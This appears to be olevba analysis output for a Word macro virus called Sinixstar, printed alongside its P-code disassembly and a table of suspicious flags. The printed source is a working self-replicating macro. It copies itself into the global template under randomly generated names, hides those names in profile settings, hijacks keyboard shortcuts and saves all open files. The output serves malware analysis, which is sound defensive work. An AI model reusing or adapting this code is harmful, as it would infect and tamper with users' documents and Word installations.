olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan.MSWord.Sinixstar
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Trojan.MSWord.Sinixstar - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./Trojan.MSWord.Sinixstar - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub MAIN()
On Error GoTo Done

a$ = DateiName$()
If a$ = "" Then GoTo Finish

If VInstalled = 0 Then
    Run1
    Run2
    RunPayload
    DateiAllesSpeichern 1, 1
Else
    GoTo Done
End If

Done:
a$ = DateiName$()
If a$ = "" Then
    GoTo Finish
Else
    Einfügen " "
End If

Finish:
MsgBox "Sinixstar", -8
End Sub

Sub Run1()
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R1$ = AbrufenDokumentVar$("VirNameDoc")
CO$ = DateiName$() + ":" + R1$
MakroKopieren CO$, "Global:" + Z$, 1
SetProfileString "Intl", "Info2", Z$
ExtrasAnpassenTastatur.TastenSchlüssel = 65, .Kategorie = 2, .Name = Z$, .Hinzufügen, .Kontext = 0
End Sub

Sub Run2()
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R2$ = AbrufenDokumentVar$("VirName")
OC$ = DateiName$() + ":" + R2$
MakroKopieren OC$, "Global:" + Z$, 1
SetProfileString "Intl", "Info1", Z$
ExtrasAnpassenTastatur.TastenSchlüssel = 32, .Kategorie = 2, .Name = Z$, .Hinzufügen, .Kontext = 0
End Sub

Sub RunPayload()
X$ = Fun$(F$, G$, H$, J$)
Y$ = Fun$(F$, G$, H$, J$)

Z$ = X$ + Y$

R3$ = AbrufenDokumentVar$("VirNamePayload")
OCO$ = DateiName$() + ":" + R3$
MakroKopieren OCO$, "Global:" + Z$, 1
SetProfileString "Intl", "Info3", Z$
End Sub

Function VInstalled()
CC$ = GetProfileString$("Intl", "Info1")
    VInstalled = 0
    If ZählenMakros(0) > 0 Then
        For i = 1 To ZählenMakros(0)
        If MakroName$(i, 0) = CC$ Then
            VInstalled = 1
        End If
    Next i
End If
End Function

Function Fun$(F$, G$, H$, J$)
One = 1169
Two = 9294
Num = Int(Rnd() * (Two - One) + One)
a$ = Str$(Num)
a$ = LTrim$(a$)

b$ = Mid$(a$, 1, 1)
C$ = Mid$(a$, 2, 1)
D$ = Mid$(a$, 3, 1)
e$ = Mid$(a$, 4, 1)

If b$ = "1" Then F$ = "A"
If b$ = "2" Then F$ = "B"
If b$ = "3" Then F$ = "C"
If b$ = "4" Then F$ = "D"
If b$ = "5" Then F$ = "E"
If b$ = "6" Then F$ = "F"
If b$ = "7" Then F$ = "G"
If b$ = "8" Then F$ = "H"
If b$ = "9" Then F$ = "I"
If b$ = "0" Then F$ = "J"

If C$ = "1" Then G$ = "H"
If C$ = "2" Then G$ = "I"
If C$ = "3" Then G$ = "J"
If C$ = "4" Then G$ = "K"
If C$ = "5" Then G$ = "L"
If C$ = "6" Then G$ = "M"
If C$ = "7" Then G$ = "N"
If C$ = "8" Then G$ = "O"
If C$ = "9" Then G$ = "P"
If C$ = "0" Then G$ = "Q"

If D$ = "1" Then H$ = "A"
If D$ = "2" Then H$ = "B"
If D$ = "3" Then H$ = "C"
If D$ = "4" Then H$ = "D"
If D$ = "5" Then H$ = "E"
If D$ = "6" Then H$ = "F"
If D$ = "7" Then H$ = "G"
If D$ = "8" Then H$ = "H"
If D$ = "9" Then H$ = "I"
If D$ = "0" Then H$ = "J"

If e$ = "1" Then J$ = "R"
If e$ = "2" Then J$ = "S"
If e$ = "3" Then J$ = "T"
If e$ = "4" Then J$ = "U"
If e$ = "5" Then J$ = "V"
If e$ = "6" Then J$ = "W"
If e$ = "7" Then J$ = "X"
If e$ = "8" Then J$ = "Y"
If e$ = "9" Then J$ = "Z"
If e$ = "0" Then J$ = "Q"

Fun$ = F$ + G$ + H$ + J$
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Trojan.MSWord.Sinixstar
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15887 bytes
' Macros/VBA/Module1 - 6750 bytes
' Line #0:
' 	FuncDefn (Sub MAIN())
' Line #1:
' 	OnError Done 
' Line #2:
' Line #3:
' 	ArgsLd DateiName$ 0x0000 
' 	St a$ 
' Line #4:
' 	Ld a$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	GoTo Finish 
' 	EndIf 
' Line #5:
' Line #6:
' 	Ld VInstalled 
' 	LitDI2 0x0000 
' 	Eq 
' 	IfBlock 
' Line #7:
' 	ArgsCall Run1 0x0000 
' Line #8:
' 	ArgsCall Run2 0x0000 
' Line #9:
' 	ArgsCall RunPayload 0x0000 
' Line #10:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsCall DateiAllesSpeichern 0x0002 
' Line #11:
' 	ElseBlock 
' Line #12:
' 	GoTo Done 
' Line #13:
' 	EndIfBlock 
' Line #14:
' Line #15:
' 	Label Done 
' Line #16:
' 	ArgsLd DateiName$ 0x0000 
' 	St a$ 
' Line #17:
' 	Ld a$ 
' 	LitStr 0x0000 ""
' 	Eq 
' 	IfBlock 
' Line #18:
' 	GoTo Finish 
' Line #19:
' 	ElseBlock 
' Line #20:
' 	LitStr 0x0001 " "
' 	ArgsCall Einfügen 0x0001 
' Line #21:
' 	EndIfBlock 
' Line #22:
' Line #23:
' 	Label Finish 
' Line #24:
' 	LitStr 0x0009 "Sinixstar"
' 	LitDI2 0x0008 
' 	UMi 
' 	ArgsCall MsgBox 0x0002 
' Line #25:
' 	EndSub 
' Line #26:
' Line #27:
' 	FuncDefn (Sub Run1())
' Line #28:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St X$ 
' Line #29:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #30:
' Line #31:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #32:
' Line #33:
' 	LitStr 0x000A "VirNameDoc"
' 	ArgsLd AbrufenDokumentVar$ 0x0001 
' 	St R1$ 
' Line #34:
' 	ArgsLd DateiName$ 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld R1$ 
' 	Add 
' 	St CO$ 
' Line #35:
' 	Ld CO$ 
' 	LitStr 0x0007 "Global:"
' 	Ld Z$ 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsCall MakroKopieren 0x0003 
' Line #36:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info2"
' 	Ld Z$ 
' 	ArgsCall SetProfileString 0x0003 
' Line #37:
' 	Reparse 0x0062 "ExtrasAnpassenTastatur.TastenSchlüssel = 65, .Kategorie = 2, .Name = Z$, .Hinzufügen, .Kontext = 0"
' Line #38:
' 	EndSub 
' Line #39:
' Line #40:
' 	FuncDefn (Sub Run2())
' Line #41:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St X$ 
' Line #42:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #43:
' Line #44:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #45:
' Line #46:
' 	LitStr 0x0007 "VirName"
' 	ArgsLd AbrufenDokumentVar$ 0x0001 
' 	St R2$ 
' Line #47:
' 	ArgsLd DateiName$ 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld R2$ 
' 	Add 
' 	St OC$ 
' Line #48:
' 	Ld OC$ 
' 	LitStr 0x0007 "Global:"
' 	Ld Z$ 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsCall MakroKopieren 0x0003 
' Line #49:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info1"
' 	Ld Z$ 
' 	ArgsCall SetProfileString 0x0003 
' Line #50:
' 	Reparse 0x0062 "ExtrasAnpassenTastatur.TastenSchlüssel = 32, .Kategorie = 2, .Name = Z$, .Hinzufügen, .Kontext = 0"
' Line #51:
' 	EndSub 
' Line #52:
' Line #53:
' 	FuncDefn (Sub RunPayload())
' Line #54:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St X$ 
' Line #55:
' 	Ld False$ 
' 	Ld G$ 
' 	Ld H$ 
' 	Ld J$ 
' 	ArgsLd Fun$ 0x0004 
' 	St Y$ 
' Line #56:
' Line #57:
' 	Ld X$ 
' 	Ld Y$ 
' 	Add 
' 	St Z$ 
' Line #58:
' Line #59:
' 	LitStr 0x000E "VirNamePayload"
' 	ArgsLd AbrufenDokumentVar$ 0x0001 
' 	St R3$ 
' Line #60:
' 	ArgsLd DateiName$ 0x0000 
' 	LitStr 0x0001 ":"
' 	Add 
' 	Ld R3$ 
' 	Add 
' 	St OCO$ 
' Line #61:
' 	Ld OCO$ 
' 	LitStr 0x0007 "Global:"
' 	Ld Z$ 
' 	Add 
' 	LitDI2 0x0001 
' 	ArgsCall MakroKopieren 0x0003 
' Line #62:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info3"
' 	Ld Z$ 
' 	ArgsCall SetProfileString 0x0003 
' Line #63:
' 	EndSub 
' Line #64:
' Line #65:
' 	FuncDefn (Function VInstalled())
' Line #66:
' 	LitStr 0x0004 "Intl"
' 	LitStr 0x0005 "Info1"
' 	ArgsLd GetProfileString$ 0x0002 
' 	St CC$ 
' Line #67:
' 	LitDI2 0x0000 
' 	St VInstalled 
' Line #68:
' 	LitDI2 0x0000 
' 	ArgsLd ZählenMakros 0x0001 
' 	LitDI2 0x0000 
' 	Gt 
' 	IfBlock 
' Line #69:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	ArgsLd ZählenMakros 0x0001 
' 	For 
' Line #70:
' 	Ld i 
' 	LitDI2 0x0000 
' 	ArgsLd MakroName$ 0x0002 
' 	Ld CC$ 
' 	Eq 
' 	IfBlock 
' Line #71:
' 	LitDI2 0x0001 
' 	St VInstalled 
' Line #72:
' 	EndIfBlock 
' Line #73:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #74:
' 	EndIfBlock 
' Line #75:
' 	EndFunc 
' Line #76:
' Line #77:
' 	FuncDefn (Function Fun(False, G, H, J))
' Line #78:
' 	LitDI2 0x0491 
' 	St One 
' Line #79:
' 	LitDI2 0x244E 
' 	St Two 
' Line #80:
' 	ArgsLd Rnd 0x0000 
' 	Ld Two 
' 	Ld One 
' 	Sub 
' 	Paren 
' 	Mul 
' 	Ld One 
' 	Add 
' 	FnInt 
' 	St Num 
' Line #81:
' 	Ld Num 
' 	ArgsLd Str$ 0x0001 
' 	St a$ 
' Line #82:
' 	Ld a$ 
' 	ArgsLd LTrim$ 0x0001 
' 	St a$ 
' Line #83:
' Line #84:
' 	Ld a$ 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St B$ 
' Line #85:
' 	Ld a$ 
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St C$ 
' Line #86:
' 	Ld a$ 
' 	LitDI2 0x0003 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St D$ 
' Line #87:
' 	Ld a$ 
' 	LitDI2 0x0004 
' 	LitDI2 0x0001 
' 	ArgsLd Mid$$ 0x0003 
' 	St e$ 
' Line #88:
' Line #89:
' 	Ld B$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St False$ 
' 	EndIf 
' Line #90:
' 	Ld B$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St False$ 
' 	EndIf 
' Line #91:
' 	Ld B$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St False$ 
' 	EndIf 
' Line #92:
' 	Ld B$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St False$ 
' 	EndIf 
' Line #93:
' 	Ld B$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St False$ 
' 	EndIf 
' Line #94:
' 	Ld B$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St False$ 
' 	EndIf 
' Line #95:
' 	Ld B$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St False$ 
' 	EndIf 
' Line #96:
' 	Ld B$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St False$ 
' 	EndIf 
' Line #97:
' 	Ld B$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St False$ 
' 	EndIf 
' Line #98:
' 	Ld B$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St False$ 
' 	EndIf 
' Line #99:
' Line #100:
' 	Ld C$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St G$ 
' 	EndIf 
' Line #101:
' 	Ld C$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St G$ 
' 	EndIf 
' Line #102:
' 	Ld C$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St G$ 
' 	EndIf 
' Line #103:
' 	Ld C$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "K"
' 	St G$ 
' 	EndIf 
' Line #104:
' 	Ld C$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "L"
' 	St G$ 
' 	EndIf 
' Line #105:
' 	Ld C$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "M"
' 	St G$ 
' 	EndIf 
' Line #106:
' 	Ld C$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "N"
' 	St G$ 
' 	EndIf 
' Line #107:
' 	Ld C$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "O"
' 	St G$ 
' 	EndIf 
' Line #108:
' 	Ld C$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "P"
' 	St G$ 
' 	EndIf 
' Line #109:
' 	Ld C$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St G$ 
' 	EndIf 
' Line #110:
' Line #111:
' 	Ld D$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "A"
' 	St H$ 
' 	EndIf 
' Line #112:
' 	Ld D$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "B"
' 	St H$ 
' 	EndIf 
' Line #113:
' 	Ld D$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	St H$ 
' 	EndIf 
' Line #114:
' 	Ld D$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "D"
' 	St H$ 
' 	EndIf 
' Line #115:
' 	Ld D$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "E"
' 	St H$ 
' 	EndIf 
' Line #116:
' 	Ld D$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "F"
' 	St H$ 
' 	EndIf 
' Line #117:
' 	Ld D$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "G"
' 	St H$ 
' 	EndIf 
' Line #118:
' 	Ld D$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "H"
' 	St H$ 
' 	EndIf 
' Line #119:
' 	Ld D$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "I"
' 	St H$ 
' 	EndIf 
' Line #120:
' 	Ld D$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "J"
' 	St H$ 
' 	EndIf 
' Line #121:
' Line #122:
' 	Ld e$ 
' 	LitStr 0x0001 "1"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "R"
' 	St J$ 
' 	EndIf 
' Line #123:
' 	Ld e$ 
' 	LitStr 0x0001 "2"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "S"
' 	St J$ 
' 	EndIf 
' Line #124:
' 	Ld e$ 
' 	LitStr 0x0001 "3"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "T"
' 	St J$ 
' 	EndIf 
' Line #125:
' 	Ld e$ 
' 	LitStr 0x0001 "4"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "U"
' 	St J$ 
' 	EndIf 
' Line #126:
' 	Ld e$ 
' 	LitStr 0x0001 "5"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "V"
' 	St J$ 
' 	EndIf 
' Line #127:
' 	Ld e$ 
' 	LitStr 0x0001 "6"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "W"
' 	St J$ 
' 	EndIf 
' Line #128:
' 	Ld e$ 
' 	LitStr 0x0001 "7"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "X"
' 	St J$ 
' 	EndIf 
' Line #129:
' 	Ld e$ 
' 	LitStr 0x0001 "8"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Y"
' 	St J$ 
' 	EndIf 
' Line #130:
' 	Ld e$ 
' 	LitStr 0x0001 "9"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Z"
' 	St J$ 
' 	EndIf 
' Line #131:
' 	Ld e$ 
' 	LitStr 0x0001 "0"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "Q"
' 	St J$ 
' 	EndIf 
' Line #132:
' Line #133:
' 	Ld False$ 
' 	Ld G$ 
' 	Add 
' 	Ld H$ 
' 	Add 
' 	Ld J$ 
' 	Add 
' 	St Fun$ 
' Line #134:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Base64    |"{e                 |Intl                                         |
|String    |                    |                                             |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

